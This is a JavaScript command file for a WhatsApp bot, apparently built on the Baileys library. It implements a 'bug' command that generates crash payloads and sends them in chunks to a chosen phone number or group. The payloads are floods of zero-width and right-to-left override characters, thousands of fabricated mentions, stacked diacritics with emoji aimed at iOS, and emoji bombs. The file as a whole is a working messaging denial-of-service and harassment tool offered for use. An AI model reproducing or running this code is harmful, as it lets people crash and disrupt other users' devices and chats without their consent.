import { bugsList } from "../bugmenu.js";

export default {
  name: "bug",
  description: "Send selected bug to a number or group",
  async execute(msg, { sock, args }) {
    try {
      const bugName = args[0]?.toLowerCase();
      let target = args[1];

      if (!bugName || !bugsList[bugName]) {
        return sock.sendMessage(msg.key.remoteJid, { text: "❌ Unknown bug. Type #bugmenu to see the list." });
      }

      if (!target) {
        return sock.sendMessage(msg.key.remoteJid, {
          text: `⚠️ You selected *${bugName}*. Please type the target number/group as:\n?bug ${bugName} <number/group>`
        });
      }

      // Check for Group-only bug
      if (bugsList[bugName].type.includes("Group only") && !target.includes("@g.us")) {
        return sock.sendMessage(msg.key.remoteJid, { text: "❌ This bug works only in groups." });
      }

      // Format target
      if (!target.includes("@g.us") && !target.includes("@s.whatsapp.net")) {
        if (target.length < 11) return sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Invalid number. Use format: 234XXXXXXXXXX" });
        target = target + "@s.whatsapp.net";
      }

      const weight = bugsList[bugName].weight;
      const CHUNK_SIZE = 50_000; // send in chunks to prevent bot freeze
      let payload = "";

      // Generate payload by bug type
      switch(bugName) {
        case "combo-crash":
          payload = ["\u200B","\u200C","\u200D","\u200E","\u200F"].join("").repeat(weight);
          break;

        case "singleline-crash":
          const chars = ["\u200B","\u200C","\u200D","\u200E","\u200F"];
          for(let i=0;i<weight;i++) payload += chars[i % chars.length];
          break;

        case "mentions-crash":
          const PREFIX="23491", UNIQUE_COUNT=2000, TOTAL_COUNT=weight;
          const base=[]; for(let i=0;i<UNIQUE_COUNT;i++) base.push(PREFIX+String(1000000+i).slice(-7)+"@s.whatsapp.net");
          const mentions=[]; while(mentions.length<TOTAL_COUNT) mentions.push(...base);
          mentions.length = TOTAL_COUNT;
          payload = mentions.join("\n");
          break;

        case "ios-heavy":
          const rtl="\u202E", lrm="\u200E", zwj="\u200D", zwnj="\u200C", diacritics="\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307", emoji="👨‍👩‍👧‍👦";
          for(let i=0;i<weight;i++) payload += rtl+emoji+diacritics.repeat(15)+zwj+zwnj+lrm+"\n";
          break;

        case "emoji-bomb":
          payload = "👾👹👺💀☠️👻".repeat(weight);
          break;

        case "rtl-bomb":
          payload = ("\u202E\u200E").repeat(weight);
          break;

        case "media-bomb":
        case "zero-width-wall":
          payload = "\u200B".repeat(weight);
          break;
      }

      // Send in chunks
      for (let i = 0; i < payload.length; i += CHUNK_SIZE) {
        await sock.sendMessage(target, { text: payload.slice(i, i + CHUNK_SIZE) });
      }

      await sock.sendMessage(msg.key.remoteJid, { text: `✅ Sent *${bugName}* to ${args[1]}` });

    } catch (e) {
      await sock.sendMessage(msg.key.remoteJid, { text: "❌ Failed: " + e.message });
    }
  }
};
